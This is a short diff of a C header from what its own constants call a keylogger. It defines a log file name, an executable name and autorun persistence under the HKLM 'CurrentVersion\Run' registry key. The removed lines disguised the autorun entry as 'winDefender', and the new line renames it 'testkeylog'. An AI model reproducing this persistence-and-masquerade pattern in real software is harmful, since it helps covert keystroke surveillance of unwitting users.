@@ -8,10 +8,10 @@
 #include "Logger.h"
 
 #define LOG_FILE_NAME "\\userdata.win"
-#define KEYLOG_NAME  "\\michifu.exe"
+#define KEYLOG_NAME  "\\miau.exe"
 #define HKEY_KEYLOGGER HKEY_LOCAL_MACHINE
 #define HKEY_KEYLOGGER_SUB "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-#define HKEY_KEYLOGER_VALUE "winDefender"
+#define HKEY_KEYLOGER_VALUE "testkeylog"
 #define IDD_MAINDIALOG                  103
 #define IDC_BUTTON_ELEVATE              1000
 #define IDC_STATIC_INADMINGROUP         1001
